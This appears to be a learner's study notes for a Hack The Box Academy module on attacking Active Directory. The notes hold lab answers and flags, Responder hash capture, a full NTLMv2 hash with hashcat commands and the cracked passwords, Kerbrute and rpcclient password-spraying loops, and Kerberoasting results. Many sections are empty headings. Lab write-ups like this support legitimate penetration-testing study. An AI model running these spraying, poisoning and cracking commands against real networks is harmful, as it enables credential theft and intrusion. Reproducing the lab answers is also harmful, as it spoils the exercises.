---
description: >-
  Active Directory (AD) is a directory service for Windows enterprise
  environments that was officially implemented in 2000 with the release of
  Windows Server 2000 and has been incrementally improved
---

# Active Directory (AD) Enumeration & Attacks

## Theory

AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization’s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functions within a Windows enterprise environment.

Microsoft Active Directory holds around 43% of the market share for enterprise organizations utilizing Identity and Access management solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending implementations with Azure AD. Another interesting stat to consider is that just in the last two years, Microsoft has had over 2000 reported vulnerabilities tied to a CVE. AD's many services and main purpose of making information easy to find and access make it a bit of a behemoth to manage and correctly harden. This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these misconfigurations and ease of access with common user and OS vulnerabilities, and you have a perfect storm for an attacker to take advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take advantage of their existence. We will practice enumerating AD utilizing native tools and languages such as Sysinternals, WMI, DNS, and many others. Some attacks we will also practice include Password spraying, Kerberoasting, utilizing tools such as Responder, Kerbrute, Bloodhound, and much more.

We may often find ourselves in a network with no clear path to a foothold through a remote exploit such as a vulnerable application or service. Yet, we are within an Active Directory environment, which can lead to a foothold in many ways. The general goal of gaining a foothold in a client's AD environment is to escalate privileges by moving laterally or vertically throughout the network until we accomplish the intent of the assessment. The goal can vary from client to client. It may be accessing a specific host, user's email inbox, database, or just complete domain compromise and looking for every possible path to Domain Admin level access within the testing period. Many open-source tools are available to facilitate enumerating and attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More importantly, we need to understand the "why" behind certain flaws and misconfigurations. This will make us more effective as attackers and equip us to give sound recommendations to our clients on the major issues within their environment, as well as clear and actionable remediation advice.

We need to be comfortable enumerating and attacking AD from both Windows and Linux, with a limited toolset or built-in Windows tools, also known as "living off the land." It is common to run into situations where our tools fail, are being blocked, or we are conducting an assessment where the client has us work from a managed workstation or VDI instance instead of the customized Linux or Windows attack host we may have grown accustomed to. To be effective in all situations, we must be able to adapt quickly on the fly, understand the many nuances of AD and know how to access them even when severely limited in our options.

## Initial Enumeration

### External Recon and Enum Principles

* DNS records
  * [https://viewdns.info](https://viewdns.info)
    * HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}

### Initial Enum of the Domain

#### Questions

**From your scans, what is the "commonName" of host 172.16.5.5 ?**

`sudo -E wireshark`

`filter ARP`

`filter MDNS`

* ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

## Sniffing out a Foothold

### LLMNR/NBT-NS Poisoning from Linux

Link-Local Multicast Name Resolution & NetBIOS Name Service

* Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.

**Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

`ssh htb-student@10.129.145.72`

`sudo responder -I ens224`

<figure><img src=".gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

* backupagent

**Crack the hash for the previous account and submit the cleartext password as your answer.**

backupagent::INLANEFREIGHT:9df2c2f0e88a851f:D30182652A8C620C3B3A0F7848A6A3F4:010100000000000080598B2FD280DA01ADD9EA7D5E21E4C50000000002000800370042004200590001001E00570049004E002D00390033004C00530035004C00580039004C0045004C0004003400570049004E002D00390033004C00530035004C00580039004C0045004C002E0037004200420059002E004C004F00430041004C000300140037004200420059002E004C004F00430041004C000500140037004200420059002E004C004F00430041004C000700080080598B2FD280DA0106000400020000000800300030000000000000000000000000300000E8459DF2F6669188B0009E81A62AB61AFCEBD20E052AC9A9F151F36E67C1DCD40A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

* hashcat -m 5600 hashbackup.txt /home/zihuatanejo/Desktop/rockyou.txt

<figure><img src=".gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

* h1backup55

**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**

<figure><img src=".gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

* hashcat -m 5600 hashwley.txt /home/zihuatanejo/Desktop/rockyou.txt
* transporter@4

### LLMNR/NBT-NS Poisoning from Windows

RDP connect (via Reminna)

## Sighting In, Hunting For a User

### Enumerating & Retrieving PW Policies

`ssh htb-student@10.129.202.203`

**What is the default Minimum password length when a new domain is created? (One number)**

7

**What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)**

`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

<figure><img src=".gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

### 8

### PW Spraying - Making a Target user List

**Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**

`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

<figure><img src=".gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

**56**

## Spray Responsibly

### Internal PW Spraying - from Linux

**Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid\_users.txt

for u in $(cat valid\_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid\_users.txt Welcome1

**sgage**

### Internal PW Spraying - from Windows

dbranch

## Deeper Down the Rabbit Hole

### Credentialed Enum - from Linux

`ssh htb-student@10.129.22.123`

**What AD User has a RID equal to Decimal 1170?**

`rpcclient -U "" -N 172.16.5.5`

decimal 1170 = hex 0x492

`queryuser 0x492`

<figure><img src=".gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

* **mmorgan**

**What is the membercount: of the "Interns" group?**

`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`

<figure><img src=".gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

**10**

### Credentialed Enum - from Windows

### Living Off the land

Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies.

## Cooking with Fire

### Kerberoasting - from Linux

**Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.**

!SapperFi2

**What powerful local group on the Domain Controller is the SAPService user a member of?**

account operators

### Kerberoasting - from Windows



## An ACE in the Hole

### ACL Abuse Primer

### ACL Enum

### ACL Abuse Tactics

### DCSync

## Stacking The Deck

### Privileged Access

Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.

But what if we don't yet have local admin rights on any hosts in the domain?

There are several other ways we can move around a Windows domain:

```
Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host

PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell

MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
```

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

```
CanRDP
CanPSRemote
SQLAdmin
```

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

#### Questions

What other user in the domain has CanPSRemote rights to a host?



What host can this user access via WinRM? (just the computer name)



Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

### Kerberos "Double Hop" Problem

### Bleeding Edge Vulns

### Misc Misconfiguration

